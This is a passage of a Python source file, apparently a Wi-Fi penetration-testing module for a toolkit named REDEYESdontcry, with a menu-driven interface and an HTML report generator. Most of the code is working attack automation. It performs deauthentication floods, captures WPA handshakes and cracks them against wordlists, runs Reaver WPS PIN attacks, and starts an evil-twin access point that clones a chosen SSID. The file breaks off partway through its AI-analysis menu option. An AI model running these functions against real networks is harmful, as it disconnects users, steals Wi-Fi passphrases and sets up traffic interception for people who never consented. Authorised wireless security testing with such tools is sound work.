#!/usr/bin/env python3
"""
Wireless Network Penetration Testing Module for REDEYESdontcry
Full-featured WiFi security testing with monitor mode, packet capture, and attacks
"""

import os
import sys
import subprocess
import time
import json
import re
import threading
import signal
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import xml.etree.ElementTree as ET

class WirelessPentest:
    def __init__(self, session_id: str, results_dir: str, ai_client=None):
        self.session_id = session_id
        self.results_dir = results_dir
        self.ai_client = ai_client
        self.wireless_dir = os.path.join(results_dir, "wireless_pentest")
        os.makedirs(self.wireless_dir, exist_ok=True)
        
        self.interfaces = []
        self.monitor_interface = None
        self.scan_results = {}
        self.capture_process = None
        
    def get_wireless_interfaces(self) -> List[Dict]:
        """Get all wireless interfaces on the system"""
        interfaces = []
        
        try:
            # Get wireless interfaces using iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID:' in line:
                    interface = line.split()[0]
                    if interface and interface not in [i['name'] for i in interfaces]:
                        # Get interface details
                        interface_info = self._get_interface_info(interface)
                        interfaces.append(interface_info)
                        
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            print(f"Error getting wireless interfaces: {e}")
            
        self.interfaces = interfaces
        return interfaces
    
    def _get_interface_info(self, interface: str) -> Dict:
        """Get detailed information about a wireless interface"""
        info = {
            'name': interface,
            'mode': 'Unknown',
            'driver': 'Unknown',
            'chipset': 'Unknown',
            'monitor_capable': False,
            'injection_capable': False
        }
        
        try:
            # Get current mode
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=5)
            if 'Mode:Managed' in result.stdout:
                info['mode'] = 'Managed'
            elif 'Mode:Monitor' in result.stdout:
                info['mode'] = 'Monitor'
                
            # Get driver information
            try:
                with open(f'/sys/class/net/{interface}/device/uevent', 'r') as f:
                    content = f.read()
                    for line in content.split('\n'):
                        if 'DRIVER=' in line:
                            info['driver'] = line.split('=')[1]
                            break
            except:
                pass
                
            # Test monitor mode capability
            info['monitor_capable'] = self._test_monitor_mode(interface)
            
            # Test injection capability  
            if info['monitor_capable']:
                info['injection_capable'] = self._test_injection_capability(interface)
                
        except Exception as e:
            print(f"Error getting info for {interface}: {e}")
            
        return info
    
    def _test_monitor_mode(self, interface: str) -> bool:
        """Test if interface can be put into monitor mode"""
        try:
            # Save current mode
            current_mode = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
            
            # Try to set monitor mode
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                          capture_output=True, timeout=5)
            result = subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], 
                                  capture_output=True, timeout=5)
            
            success = result.returncode == 0
            
            # Restore original mode
            subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'managed'], 
                          capture_output=True, timeout=5)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                          capture_output=True, timeout=5)
            
            return success
            
        except Exception:
            return False
    
    def _test_injection_capability(self, interface: str) -> bool:
        """Test packet injection capability"""
        try:
            # This is a basic test - in production you'd use aireplay-ng --test
            result = subprocess.run(['which', 'aireplay-ng'], capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def enable_monitor_mode(self, interface: str) -> bool:
        """Enable monitor mode on wireless interface"""
        try:
            print(f"[*] Enabling monitor mode on {interface}")
            
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                          capture_output=True, timeout=30)
            
            # Enable monitor mode using airmon-ng
            result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                # Find monitor interface name (usually interface + 'mon')
                for line in result.stdout.split('\n'):
                    if 'monitor mode enabled' in line.lower():
                        # Extract monitor interface name
                        monitor_match = re.search(r'on (\w+)', line)
                        if monitor_match:
                            self.monitor_interface = monitor_match.group(1)
                            print(f"[+] Monitor mode enabled on {self.monitor_interface}")
                            return True
                            
                # Fallback: try common monitor interface names
                possible_names = [f"{interface}mon", f"{interface}_mon", "mon0"]
                for name in possible_names:
                    try:
                        subprocess.run(['iwconfig', name], capture_output=True, timeout=5)
                        self.monitor_interface = name
                        print(f"[+] Monitor interface found: {name}")
                        return True
                    except:
                        continue
            
            return False
            
        except Exception as e:
            print(f"[-] Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode and restore managed mode"""
        if not self.monitor_interface:
            return True
            
        try:
            print(f"[*] Disabling monitor mode on {self.monitor_interface}")
            
            # Stop monitor mode using airmon-ng
            result = subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print("[+] Monitor mode disabled")
                self.monitor_interface = None
                return True
                
        except Exception as e:
            print(f"[-] Error disabling monitor mode: {e}")
            
        return False
    
    def scan_networks(self, duration: int = 60, channel: Optional[int] = None) -> Dict:
        """Scan for nearby wireless networks"""
        if not self.monitor_interface:
            raise Exception("Monitor mode not enabled")
            
        scan_file = os.path.join(self.wireless_dir, f"scan_{self.session_id}")
        
        try:
            print(f"[*] Scanning for {duration} seconds...")
            
            # Build airodump-ng command
            cmd = ['sudo', 'airodump-ng', self.monitor_interface, 
                   '--write', scan_file, '--output-format', 'csv,kismet,netxml']
            
            if channel:
                cmd.extend(['--channel', str(channel)])
            
            # Run airodump-ng for specified duration
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE)
            
            time.sleep(duration)
            process.terminate()
            process.wait(timeout=10)
            
            # Parse results
            networks = self._parse_airodump_results(scan_file)
            self.scan_results = networks
            
            print(f"[+] Found {len(networks.get('access_points', []))} access points")
            print(f"[+] Found {len(networks.get('clients', []))} clients")
            
            return networks
            
        except Exception as e:
            print(f"[-] Scan error: {e}")
            return {}
    
    def _parse_airodump_results(self, scan_file: str) -> Dict:
        """Parse airodump-ng results from CSV file"""
        networks = {'access_points': [], 'clients': []}
        csv_file = f"{scan_file}-01.csv"
        
        if not os.path.exists(csv_file):
            return networks
            
        try:
            with open(csv_file, 'r') as f:
                content = f.read()
                
            lines = content.split('\n')
            parsing_aps = True
            
            for line in lines:
                if not line.strip():
                    continue
                    
                if 'Station MAC' in line:
                    parsing_aps = False
                    continue
                    
                if parsing_aps and 'BSSID' not in line:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        ap = {
                            'bssid': parts[0],
                            'first_seen': parts[1],
                            'last_seen': parts[2],
                            'channel': parts[3],
                            'speed': parts[4],
                            'privacy': parts[5],
                            'cipher': parts[6],
                            'auth': parts[7],
                            'power': parts[8],
                            'beacons': parts[9],
                            'iv': parts[10],
                            'lan_ip': parts[11],
                            'id_length': parts[12],
                            'essid': parts[13],
                            'key': parts[14] if len(parts) > 14 else ''
                        }
                        networks['access_points'].append(ap)
                        
                elif not parsing_aps and 'Station MAC' not in line:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 6:
                        client = {
                            'station_mac': parts[0],
                            'first_seen': parts[1],
                            'last_seen': parts[2],
                            'power': parts[3],
                            'packets': parts[4],
                            'bssid': parts[5],
                            'probed_essids': parts[6] if len(parts) > 6 else ''
                        }
                        networks['clients'].append(client)
                        
        except Exception as e:
            print(f"[-] Error parsing scan results: {e}")
            
        return networks
    
    def capture_handshake(self, target_bssid: str, target_channel: str, 
                         duration: int = 300) -> str:
        """Capture WPA/WPA2 handshake"""
        if not self.monitor_interface:
            raise Exception("Monitor mode not enabled")
            
        capture_file = os.path.join(self.wireless_dir, 
                                   f"handshake_{target_bssid.replace(':', '')}_{self.session_id}")
        
        try:
            print(f"[*] Capturing handshake for {target_bssid} on channel {target_channel}")
            
            # Set channel
            subprocess.run(['sudo', 'iwconfig', self.monitor_interface, 'channel', target_channel], 
                          timeout=10)
            
            # Start airodump-ng to capture handshake
            cmd = ['sudo', 'airodump-ng', self.monitor_interface, 
                   '--bssid', target_bssid, '--channel', target_channel,
                   '--write', capture_file]
            
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                                   stderr=subprocess.PIPE)
            
            # Wait for capture or timeout
            start_time = time.time()
            while time.time() - start_time < duration:
                if self._check_handshake_captured(capture_file):
                    print("[+] Handshake captured!")
                    break
                time.sleep(5)
            
            self.capture_process.terminate()
            self.capture_process = None
            
            return f"{capture_file}-01.cap"
            
        except Exception as e:
            print(f"[-] Handshake capture error: {e}")
            if self.capture_process:
                self.capture_process.terminate()
            return ""
    
    def _check_handshake_captured(self, capture_file: str) -> bool:
        """Check if handshake has been captured"""
        cap_file = f"{capture_file}-01.cap"
        if not os.path.exists(cap_file):
            return False
            
        try:
            # Use aircrack-ng to check for handshake
            result = subprocess.run(['aircrack-ng', cap_file], 
                                  capture_output=True, text=True, timeout=30)
            
            return 'handshake' in result.stdout.lower()
            
        except Exception:
            return False
    
    def deauth_attack(self, target_bssid: str, target_client: str = None, 
                     count: int = 10) -> bool:
        """Perform deauthentication attack"""
        if not self.monitor_interface:
            raise Exception("Monitor mode not enabled")
            
        try:
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count), 
                   '-a', target_bssid, self.monitor_interface]
            
            if target_client:
                cmd.extend(['-c', target_client])
                print(f"[*] Deauthing client {target_client} from {target_bssid}")
            else:
                print(f"[*] Deauthing all clients from {target_bssid}")
                
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print("[+] Deauth attack completed")
                return True
            else:
                print(f"[-] Deauth attack failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[-] Deauth attack error: {e}")
            return False
    
    def crack_wpa_handshake(self, handshake_file: str, wordlist: str) -> Dict:
        """Crack WPA/WPA2 handshake using wordlist"""
        if not os.path.exists(handshake_file):
            return {'success': False, 'error': 'Handshake file not found'}
            
        if not os.path.exists(wordlist):
            return {'success': False, 'error': 'Wordlist not found'}
            
        try:
            print(f"[*] Cracking handshake with wordlist: {wordlist}")
            
            result = subprocess.run(['aircrack-ng', '-w', wordlist, handshake_file], 
                                  capture_output=True, text=True, timeout=3600)
            
            output = result.stdout
            
            # Check if password was found
            if 'KEY FOUND!' in output:
                # Extract password
                for line in output.split('\n'):
                    if 'KEY FOUND!' in line:
                        password_match = re.search(r'\[ (.+) \]', line)
                        if password_match:
                            password = password_match.group(1)
                            print(f"[+] Password found: {password}")
                            return {
                                'success': True,
                                'password': password,
                                'output': output
                            }
                            
            print("[-] Password not found in wordlist")
            return {
                'success': False,
                'error': 'Password not found',
                'output': output
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Timeout during cracking'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def wps_attack(self, target_bssid: str, target_channel: str) -> Dict:
        """Attempt WPS PIN attack"""
        if not self.monitor_interface:
            return {'success': False, 'error': 'Monitor mode not enabled'}
            
        try:
            print(f"[*] Attempting WPS attack on {target_bssid}")
            
            # Set channel
            subprocess.run(['sudo', 'iwconfig', self.monitor_interface, 'channel', target_channel], 
                          timeout=10)
            
            # Run reaver for WPS attack
            cmd = ['sudo', 'reaver', '-i', self.monitor_interface, '-b', target_bssid, 
                   '-vv', '-S', '-N', '-d7', '-T1', '-t15', '-c', target_channel]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            
            output = result.stdout
            
            # Check if WPS PIN was found
            if 'WPS PIN:' in output and 'WPA PSK:' in output:
                pin_match = re.search(r'WPS PIN: (\d+)', output)
                psk_match = re.search(r'WPA PSK: (.+)', output)
                
                if pin_match and psk_match:
                    return {
                        'success': True,
                        'wps_pin': pin_match.group(1),
                        'wpa_psk': psk_match.group(1),
                        'output': output
                    }
                    
            return {
                'success': False,
                'error': 'WPS attack failed',
                'output': output
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'WPS attack timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def evil_twin_attack(self, target_ssid: str, target_channel: str) -> bool:
        """Create evil twin access point"""
        try:
            print(f"[*] Creating evil twin for {target_ssid}")
            
            # Create hostapd configuration
            hostapd_conf = os.path.join(self.wireless_dir, 'hostapd.conf')
            
            config = f"""interface={self.monitor_interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={target_channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
            
            with open(hostapd_conf, 'w') as f:
                f.write(config)
            
            # Start hostapd
            cmd = ['sudo', 'hostapd', hostapd_conf]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE)
            
            print(f"[+] Evil twin started. PID: {process.pid}")
            print("[!] Press Ctrl+C to stop")
            
            # Keep running until interrupted
            try:
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                print("\n[*] Evil twin stopped")
                
            return True
            
        except Exception as e:
            print(f"[-] Evil twin error: {e}")
            return False
    
    def generate_wireless_report(self) -> str:
        """Generate comprehensive wireless pentest report"""
        report_file = os.path.join(self.wireless_dir, f"wireless_report_{self.session_id}.html")
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Wireless Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #333; color: white; padding: 20px; border-radius: 5px; }}
        .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
        .network {{ background: #f9f9f9; padding: 10px; margin: 10px 0; border-radius: 3px; }}
        .vulnerable {{ background: #ffebee; border-left: 5px solid #f44336; }}
        .secure {{ background: #e8f5e8; border-left: 5px solid #4caf50; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>📡 Wireless Penetration Test Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Session ID: {self.session_id}</p>
    </div>
    
    <div class="section">
        <h2>📊 Executive Summary</h2>
        <p>This report details the wireless security assessment conducted using the REDEYESdontcry framework.</p>
        {self._generate_summary_stats()}
    </div>
    
    <div class="section">
        <h2>🌐 Discovered Networks</h2>
        {self._generate_networks_table()}
    </div>
    
    <div class="section">
        <h2>👥 Client Devices</h2>
        {self._generate_clients_table()}
    </div>
    
    <div class="section">
        <h2>🔓 Security Findings</h2>
        {self._generate_security_findings()}
    </div>
    
    <div class="section">
        <h2>🎯 Recommendations</h2>
        {self._generate_recommendations()}
    </div>
</body>
</html>"""
        
        with open(report_file, 'w') as f:
            f.write(html_content)
            
        return report_file
    
    def _generate_summary_stats(self) -> str:
        """Generate summary statistics"""
        if not self.scan_results:
            return "<p>No scan results available.</p>"
            
        aps = self.scan_results.get('access_points', [])
        clients = self.scan_results.get('clients', [])
        
        # Count security types
        open_aps = len([ap for ap in aps if ap['privacy'] in ['', 'OPN']])
        wep_aps = len([ap for ap in aps if 'WEP' in ap['privacy']])
        wpa_aps = len([ap for ap in aps if 'WPA' in ap['privacy']])
        
        return f"""
        <table>
            <tr><th>Metric</th><th>Count</th></tr>
            <tr><td>Total Access Points</td><td>{len(aps)}</td></tr>
            <tr><td>Total Clients</td><td>{len(clients)}</td></tr>
            <tr><td>Open Networks</td><td>{open_aps}</td></tr>
            <tr><td>WEP Networks</td><td>{wep_aps}</td></tr>
            <tr><td>WPA/WPA2 Networks</td><td>{wpa_aps}</td></tr>
        </table>
        """
    
    def _generate_networks_table(self) -> str:
        """Generate networks table for report"""
        if not self.scan_results or not self.scan_results.get('access_points'):
            return "<p>No networks discovered.</p>"
            
        aps = self.scan_results['access_points']
        
        table = """<table>
        <tr><th>ESSID</th><th>BSSID</th><th>Channel</th><th>Security</th><th>Signal</th><th>Clients</th></tr>"""
        
        for ap in aps:
            # Count clients for this AP
            client_count = len([c for c in self.scan_results.get('clients', []) 
                               if c['bssid'] == ap['bssid']])
            
            security_class = "vulnerable" if ap['privacy'] in ['', 'OPN', 'WEP'] else "secure"
            
            table += f"""
            <tr class="{security_class}">
                <td>{ap['essid'] or 'Hidden'}</td>
                <td>{ap['bssid']}</td>
                <td>{ap['channel']}</td>
                <td>{ap['privacy']}</td>
                <td>{ap['power']} dBm</td>
                <td>{client_count}</td>
            </tr>"""
            
        table += "</table>"
        return table
    
    def _generate_clients_table(self) -> str:
        """Generate clients table for report"""
        if not self.scan_results or not self.scan_results.get('clients'):
            return "<p>No clients discovered.</p>"
            
        clients = self.scan_results['clients']
        
        table = """<table>
        <tr><th>Client MAC</th><th>Associated BSSID</th><th>Signal</th><th>Probed ESSIDs</th></tr>"""
        
        for client in clients:
            table += f"""
            <tr>
                <td>{client['station_mac']}</td>
                <td>{client['bssid']}</td>
                <td>{client['power']} dBm</td>
                <td>{client['probed_essids']}</td>
            </tr>"""
            
        table += "</table>"
        return table
    
    def _generate_security_findings(self) -> str:
        """Generate security findings section"""
        if not self.scan_results:
            return "<p>No security analysis available.</p>"
            
        findings = []
        aps = self.scan_results.get('access_points', [])
        
        # Check for open networks
        open_aps = [ap for ap in aps if ap['privacy'] in ['', 'OPN']]
        if open_aps:
            findings.append(f"<div class='network vulnerable'><strong>CRITICAL:</strong> {len(open_aps)} open networks found</div>")
        
        # Check for WEP networks
        wep_aps = [ap for ap in aps if 'WEP' in ap['privacy']]
        if wep_aps:
            findings.append(f"<div class='network vulnerable'><strong>HIGH:</strong> {len(wep_aps)} WEP networks found (easily crackable)</div>")
        
        # Check for WPS enabled networks
        wps_aps = [ap for ap in aps if 'WPS' in ap.get('auth', '')]
        if wps_aps:
            findings.append(f"<div class='network vulnerable'><strong>MEDIUM:</strong> {len(wps_aps)} WPS-enabled networks found</div>")
        
        if not findings:
            findings.append("<div class='network secure'><strong>GOOD:</strong> No major security issues detected</div>")
        
        return ''.join(findings)
    
    def _generate_recommendations(self) -> str:
        """Generate security recommendations"""
        return """
        <ul>
            <li>Disable WPS on all access points</li>
            <li>Use WPA3 or at minimum WPA2 encryption</li>
            <li>Implement strong passphrases (12+ characters)</li>
            <li>Enable MAC address filtering if appropriate</li>
            <li>Regularly update firmware on wireless devices</li>
            <li>Monitor for rogue access points</li>
            <li>Implement wireless intrusion detection</li>
        </ul>
        """

def run_wireless_pentest_menu(session_id: str, results_dir: str, ai_client=None):
    """Run the wireless penetration testing menu"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import track
    
    console = Console()
    wireless = WirelessPentest(session_id, results_dir, ai_client)
    
    while True:
        console.clear()
        
        # Get wireless interfaces
        interfaces = wireless.get_wireless_interfaces()
        
        # Display menu
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Option", style="cyan", width=8)
        table.add_column("Wireless Attack", style="white", width=35)
        table.add_column("Status", style="green", width=15)
        
        table.add_row("1", "📡 Scan Wireless Networks", "Available")
        table.add_row("2", "🔓 Capture WPA Handshake", "Available") 
        table.add_row("3", "💥 Deauthentication Attack", "Available")
        table.add_row("4", "🔐 Crack WPA/WPA2 Password", "Available")
        table.add_row("5", "📌 WPS PIN Attack", "Available")
        table.add_row("6", "👻 Evil Twin Attack", "Available")
        table.add_row("7", "⚙️ Interface Management", f"{len(interfaces)} found")
        table.add_row("8", "🤖 AI Wireless Analysis", "Available")
        table.add_row("9", "📊 Generate Report", "Available")
        table.add_row("0", "⬅️ Back to Main Menu", "")
        
        console.print(Panel(table, title="📡 Wireless Network Penetration Testing", 
                           subtitle="Professional WiFi Security Assessment"))
        
        # Show current monitor interface status
        if wireless.monitor_interface:
            console.print(f"[green]✅ Monitor mode active on: {wireless.monitor_interface}[/green]")
        else:
            console.print("[red]❌ Monitor mode not active[/red]")
        
        choice = Prompt.ask("Select wireless attack option", 
                           choices=["0","1","2","3","4","5","6","7","8","9"])
        
        if choice == "0":
            # Cleanup before exit
            if wireless.monitor_interface:
                wireless.disable_monitor_mode()
            break
            
        elif choice == "1":
            # Scan wireless networks
            if not wireless.monitor_interface:
                if not interfaces:
                    console.print("❌ No wireless interfaces found!")
                    continue
                    
                # Show interfaces and enable monitor mode
                interface_table = Table()
                interface_table.add_column("Interface", style="cyan")
                interface_table.add_column("Alias", style="magenta")
                interface_table.add_column("Mode", style="yellow") 
                interface_table.add_column("Monitor Capable", style="green")
                
                def _alias(n: str) -> str:
                    if n.startswith('wl'):
                        return 'WiFi-' + n[2:]
                    if n.startswith('wlan'):
                        return 'WiFi-' + n[4:]
                    if n.startswith('en') or n.startswith('eth'):
                        base = n[3:] if n.startswith('eth') else n[2:]
                        return 'LAN-' + base
                    if 'mon' in n:
                        return 'MON-' + n.split('mon')[-1]
                    return n
                
                for iface in interfaces:
                    capable = "✅" if iface['monitor_capable'] else "❌"
                    interface_table.add_row(iface['name'], _alias(iface['name']), iface['mode'], capable)
                    
                console.print(interface_table)
                
                iface_name = Prompt.ask("Select interface for monitor mode", 
                                       choices=[i['name'] for i in interfaces])
                
                if not wireless.enable_monitor_mode(iface_name):
                    console.print("❌ Failed to enable monitor mode!")
                    continue
            
            duration = IntPrompt.ask("Scan duration (seconds)", default=60)
            channel = Prompt.ask("Specific channel (or press Enter for all)", default="")
            
            channel_num = int(channel) if channel.isdigit() else None
            
            with console.status("[bold green]Scanning wireless networks..."):
                results = wireless.scan_networks(duration, channel_num)
            
            if results:
                console.print(f"[green]✅ Found {len(results.get('access_points', []))} access points[/green]")
                console.print(f"[green]✅ Found {len(results.get('clients', []))} clients[/green]")
                
                # Show top networks
                aps = results.get('access_points', [])[:10]  # Show first 10
                if aps:
                    ap_table = Table()
                    ap_table.add_column("ESSID", style="cyan")
                    ap_table.add_column("BSSID", style="yellow")
                    ap_table.add_column("Channel", style="blue")
                    ap_table.add_column("Security", style="red")
                    ap_table.add_column("Power", style="green")
                    
                    for ap in aps:
                        ap_table.add_row(
                            ap['essid'] or 'Hidden',
                            ap['bssid'],
                            ap['channel'],
                            ap['privacy'],
                            f"{ap['power']} dBm"
                        )
                    
                    console.print(ap_table)
            
        elif choice == "2":
            # Capture WPA handshake
            if not wireless.scan_results:
                console.print("❌ No scan results. Please scan networks first!")
                continue
                
            aps = wireless.scan_results.get('access_points', [])
            wpa_aps = [ap for ap in aps if 'WPA' in ap['privacy']]
            
            if not wpa_aps:
                console.print("❌ No WPA networks found!")
                continue
            
            # Show WPA networks
            console.print("\nWPA/WPA2 Networks:")
            for i, ap in enumerate(wpa_aps[:20]):  # Show first 20
                console.print(f"{i+1}. {ap['essid'] or 'Hidden'} ({ap['bssid']}) - Ch:{ap['channel']}")
            
            target_idx = IntPrompt.ask("Select target network", 
                                      choices=[str(i+1) for i in range(len(wpa_aps[:20]))])
            target_ap = wpa_aps[target_idx - 1]
            
            duration = IntPrompt.ask("Capture duration (seconds)", default=300)
            
            with console.status(f"[bold yellow]Capturing handshake from {target_ap['essid']}..."):
                cap_file = wireless.capture_handshake(target_ap['bssid'], 
                                                    target_ap['channel'], duration)
            
            if cap_file and os.path.exists(cap_file):
                console.print(f"[green]✅ Handshake saved to: {cap_file}[/green]")
            else:
                console.print("❌ Failed to capture handshake!")
            
        elif choice == "3":
            # Deauthentication attack
            if not wireless.scan_results:
                console.print("❌ No scan results. Please scan networks first!")
                continue
            
            aps = wireless.scan_results.get('access_points', [])
            if not aps:
                console.print("❌ No access points found!")
                continue
                
            # Show networks
            console.print("\nAvailable Networks:")
            for i, ap in enumerate(aps[:20]):
                console.print(f"{i+1}. {ap['essid'] or 'Hidden'} ({ap['bssid']}) - Ch:{ap['channel']}")
            
            target_idx = IntPrompt.ask("Select target network",
                                      choices=[str(i+1) for i in range(len(aps[:20]))])
            target_ap = aps[target_idx - 1]
            
            # Ask for specific client or broadcast
            clients = wireless.scan_results.get('clients', [])
            target_clients = [c for c in clients if c['bssid'] == target_ap['bssid']]
            
            if target_clients:
                console.print("\nConnected Clients:")
                console.print("0. All clients (broadcast)")
                for i, client in enumerate(target_clients):
                    console.print(f"{i+1}. {client['station_mac']}")
                
                client_idx = IntPrompt.ask("Select target client", 
                                         choices=[str(i) for i in range(len(target_clients) + 1)])
                
                target_client = target_clients[client_idx - 1]['station_mac'] if client_idx > 0 else None
            else:
                target_client = None
            
            count = IntPrompt.ask("Number of deauth packets", default=10)
            
            # Warning before attack
            if not Confirm.ask("⚠️ This will disconnect users. Continue?"):
                continue
            
            with console.status("[bold red]Performing deauth attack..."):
                success = wireless.deauth_attack(target_ap['bssid'], target_client, count)
            
            if success:
                console.print("[green]✅ Deauth attack completed[/green]")
            else:
                console.print("❌ Deauth attack failed!")
            
        elif choice == "4":
            # Crack WPA password
            handshake_file = Prompt.ask("Enter handshake file path")
            
            if not os.path.exists(handshake_file):
                console.print("❌ Handshake file not found!")
                continue
            
            # Suggest common wordlists
            common_wordlists = [
                "/usr/share/wordlists/rockyou.txt",
                "/usr/share/wordlists/fasttrack.txt",
                "/usr/share/wordlists/metasploit/common_passwords.txt"
            ]
            
            available_wordlists = [w for w in common_wordlists if os.path.exists(w)]
            
            if available_wordlists:
                console.print("\nAvailable wordlists:")
                for i, wl in enumerate(available_wordlists):
                    console.print(f"{i+1}. {wl}")
                console.print(f"{len(available_wordlists)+1}. Custom wordlist")
                
                wl_choice = IntPrompt.ask("Select wordlist",
                                        choices=[str(i+1) for i in range(len(available_wordlists)+1)])
                
                if wl_choice <= len(available_wordlists):
                    wordlist = available_wordlists[wl_choice - 1]
                else:
                    wordlist = Prompt.ask("Enter custom wordlist path")
            else:
                wordlist = Prompt.ask("Enter wordlist path")
            
            if not os.path.exists(wordlist):
                console.print("❌ Wordlist not found!")
                continue
            
            console.print("⚠️ This may take a very long time...")
            if not Confirm.ask("Continue with password cracking?"):
                continue
            
            with console.status("[bold yellow]Cracking WPA password..."):
                result = wireless.crack_wpa_handshake(handshake_file, wordlist)
            
            if result['success']:
                console.print(f"[green]🎉 PASSWORD FOUND: {result['password']}[/green]")
            else:
                console.print(f"❌ Password not found: {result['error']}")
            
        elif choice == "5":
            # WPS PIN attack
            if not wireless.scan_results:
                console.print("❌ No scan results. Please scan networks first!")
                continue
            
            aps = wireless.scan_results.get('access_points', [])
            # Filter for networks that might have WPS
            potential_wps = [ap for ap in aps if 'WPA' in ap['privacy']]
            
            if not potential_wps:
                console.print("❌ No potential WPS targets found!")
                continue
            
            console.print("\nPotential WPS Targets:")
            for i, ap in enumerate(potential_wps[:10]):
                console.print(f"{i+1}. {ap['essid'] or 'Hidden'} ({ap['bssid']}) - Ch:{ap['channel']}")
            
            target_idx = IntPrompt.ask("Select target network",
                                      choices=[str(i+1) for i in range(len(potential_wps[:10]))])
            target_ap = potential_wps[target_idx - 1]
            
            console.print("⚠️ WPS attacks can take 4-10 hours and may lock out WPS!")
            if not Confirm.ask("Continue with WPS attack?"):
                continue
            
            with console.status("[bold yellow]Attempting WPS PIN attack..."):
                result = wireless.wps_attack(target_ap['bssid'], target_ap['channel'])
            
            if result['success']:
                console.print(f"[green]🎉 WPS PIN: {result['wps_pin']}[/green]")
                console.print(f"[green]🎉 WPA PSK: {result['wpa_psk']}[/green]")
            else:
                console.print(f"❌ WPS attack failed: {result['error']}")
            
        elif choice == "6":
            # Evil twin attack
            if not wireless.scan_results:
                console.print("❌ No scan results. Please scan networks first!")
                continue
            
            aps = wireless.scan_results.get('access_points', [])
            if not aps:
                console.print("❌ No access points found!")
                continue
            
            console.print("\nNetworks to clone:")
            for i, ap in enumerate(aps[:10]):
                console.print(f"{i+1}. {ap['essid'] or 'Hidden'} - Ch:{ap['channel']}")
            
            target_idx = IntPrompt.ask("Select network to clone",
                                      choices=[str(i+1) for i in range(len(aps[:10]))])
            target_ap = aps[target_idx - 1]
            
            console.print("⚠️ This creates a rogue access point!")
            console.print("⚠️ Only use on networks you own!")
            if not Confirm.ask("Continue with evil twin attack?"):
                continue
            
            wireless.evil_twin_attack(target_ap['essid'], target_ap['channel'])
            
        elif choice == "7":
            # Interface management
            interfaces = wireless.get_wireless_interfaces()
            
            if not interfaces:
                console.print("❌ No wireless interfaces found!")
                continue
            
            # Show interface details
            iface_table = Table()
            iface_table.add_column("Interface", style="cyan")
            iface_table.add_column("Alias", style="magenta")
            iface_table.add_column("Mode", style="yellow")
            iface_table.add_column("Driver", style="blue")
            iface_table.add_column("Monitor", style="green")
            iface_table.add_column("Injection", style="red")
            
            def _alias(n: str) -> str:
                if n.startswith('wl'):
                    return 'WiFi-' + n[2:]
                if n.startswith('wlan'):
                    return 'WiFi-' + n[4:]
                if n.startswith('en') or n.startswith('eth'):
                    base = n[3:] if n.startswith('eth') else n[2:]
                    return 'LAN-' + base
                if 'mon' in n:
                    return 'MON-' + n.split('mon')[-1]
                return n
            
            for iface in interfaces:
                monitor = "✅" if iface['monitor_capable'] else "❌"
                injection = "✅" if iface['injection_capable'] else "❌"
                iface_table.add_row(
                    iface['name'], _alias(iface['name']), iface['mode'], iface['driver'], monitor, injection
                )
            
            console.print(iface_table)
            
            if wireless.monitor_interface:
                if Confirm.ask("Disable monitor mode?"):
                    wireless.disable_monitor_mode()
            else:
                capable_interfaces = [i for i in interfaces if i['monitor_capable']]
                if capable_interfaces:
                    iface_name = Prompt.ask("Enable monitor mode on interface",
                                           choices=[i['name'] for i in capable_interfaces])
                    wireless.enable_monitor_mode(iface_name)
            
        elif choice == "8":
            # AI wireless analysis
            if not ai_client:
                console.print("❌ AI client not available!")
                continue
            
            if not wireless.scan_results:
                console.print("❌ No scan results for AI analysis!")
                continue
            
            with console.status("🤖 AI analyzing wireless security..."):
